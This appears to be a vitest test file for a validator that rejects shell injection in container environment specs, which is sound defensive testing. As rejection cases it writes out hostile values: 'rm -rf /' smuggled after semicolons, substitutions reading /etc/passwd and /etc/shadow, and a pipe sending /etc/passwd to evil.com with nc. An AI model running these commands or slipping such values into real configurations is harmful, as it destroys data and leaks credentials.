import { describe, it, expect } from "vitest";
import type { EnvironmentSpec } from "@ashara/development";
import {
  validateContainerfileSpec,
  ContainerfileValidationError,
} from "./containerfile-validation.js";

function validSpec(overrides?: Partial<EnvironmentSpec>): EnvironmentSpec {
  return {
    baseImage: "ubuntu:22.04",
    toolchains: [
      { name: "node", version: "20", installMethod: "apt-get update && apt-get install -y nodejs" },
    ],
    systemPackages: ["apt-get update && apt-get install -y gcc"],
    envVars: { NODE_ENV: "production" },
    networkPolicy: { provision: true, build: true, test: false, run: false },
    projectMount: "/workspace",
    ...overrides,
  };
}

describe("validateContainerfileSpec", () => {
  it("accepts a well-formed spec", () => {
    expect(() => validateContainerfileSpec(validSpec())).not.toThrow();
  });

  it("accepts multi-segment registry images", () => {
    expect(() =>
      validateContainerfileSpec(validSpec({ baseImage: "ghcr.io/org/image:latest" })),
    ).not.toThrow();
  });

  it("accepts images with sha256 digest", () => {
    expect(() =>
      validateContainerfileSpec(
        validSpec({ baseImage: "node@sha256:abcdef0123456789" }),
      ),
    ).not.toThrow();
  });

  // -- baseImage ----------------------------------------------------------

  describe("baseImage", () => {
    it("rejects command substitution", () => {
      const spec = validSpec({ baseImage: "$(malicious)" });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });

    it("rejects semicolons", () => {
      const spec = validSpec({ baseImage: "ubuntu; rm -rf /" });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });

    it("rejects backticks", () => {
      const spec = validSpec({ baseImage: "`whoami`" });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });

    it("rejects pipe characters", () => {
      const spec = validSpec({ baseImage: "ubuntu|evil" });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });
  });

  // -- systemPackages -----------------------------------------------------

  describe("systemPackages", () => {
    it("accepts legitimate install commands with &&", () => {
      const spec = validSpec({
        systemPackages: ["apt-get update && apt-get install -y libssl-dev"],
      });
      expect(() => validateContainerfileSpec(spec)).not.toThrow();
    });

    it("rejects backtick substitution", () => {
      const spec = validSpec({
        systemPackages: ["apt-get install `cat /etc/passwd`"],
      });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });

    it("rejects command substitution", () => {
      const spec = validSpec({
        systemPackages: ["apt-get install $(cat /etc/passwd)"],
      });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });

    it("rejects process substitution", () => {
      const spec = validSpec({
        systemPackages: ["cat <(env)"],
      });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });
  });

  // -- toolchains.installMethod -------------------------------------------

  describe("toolchains.installMethod", () => {
    it("accepts legitimate install with &&", () => {
      const spec = validSpec({
        toolchains: [
          { name: "gcc", installMethod: "apt-get update && apt-get install -y gcc" },
        ],
      });
      expect(() => validateContainerfileSpec(spec)).not.toThrow();
    });

    it("rejects command substitution", () => {
      const spec = validSpec({
        toolchains: [
          { name: "evil", installMethod: "echo $(cat /etc/shadow)" },
        ],
      });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });

    it("rejects function definition", () => {
      const spec = validSpec({
        toolchains: [
          { name: "evil", installMethod: "evil() { rm -rf /; }" },
        ],
      });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });
  });

  // -- envVars ------------------------------------------------------------

  describe("envVars", () => {
    it("accepts plain values", () => {
      const spec = validSpec({
        envVars: { PATH: "/usr/local/bin", LANG: "en_US.UTF-8" },
      });
      expect(() => validateContainerfileSpec(spec)).not.toThrow();
    });

    it("rejects command substitution in value", () => {
      const spec = validSpec({
        envVars: { EVIL: "$(cat /etc/passwd)" },
      });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });

    it("rejects semicolons in value", () => {
      const spec = validSpec({
        envVars: { EVIL: "value; rm -rf /" },
      });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });

    it("rejects pipe in value", () => {
      const spec = validSpec({
        envVars: { EVIL: "cat /etc/passwd | nc evil.com 1234" },
      });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });

    it("rejects invalid key format", () => {
      const spec = validSpec({
        envVars: { "123BAD": "value" },
      });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });
  });

  // -- projectMount -------------------------------------------------------

  describe("projectMount", () => {
    it("accepts /workspace", () => {
      const spec = validSpec({ projectMount: "/workspace" });
      expect(() => validateContainerfileSpec(spec)).not.toThrow();
    });

    it("accepts nested paths", () => {
      const spec = validSpec({ projectMount: "/home/user/project" });
      expect(() => validateContainerfileSpec(spec)).not.toThrow();
    });

    it("rejects relative paths", () => {
      const spec = validSpec({ projectMount: "workspace" });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });

    it("rejects shell metacharacters", () => {
      const spec = validSpec({ projectMount: "/workspace; rm -rf /" });
      expect(() => validateContainerfileSpec(spec)).toThrow(ContainerfileValidationError);
    });
  });

  // -- error structure ----------------------------------------------------

  describe("error structure", () => {
    it("includes field, value, rule, and detail", () => {
      const spec = validSpec({
        systemPackages: ["echo $(cat /etc/shadow)"],
      });
      try {
        validateContainerfileSpec(spec);
        expect.fail("should have thrown");
      } catch (e) {
        expect(e).toBeInstanceOf(ContainerfileValidationError);
        const err = e as ContainerfileValidationError;
        expect(err.context.field).toBe("systemPackages");
        expect(err.context.value).toBe("echo $(cat /etc/shadow)");
        expect(err.context.rule).toContain("injection");
        expect(err.context.detail).toBeTruthy();
        expect(err.name).toBe("ContainerfileValidationError");
      }
    });
  });
});
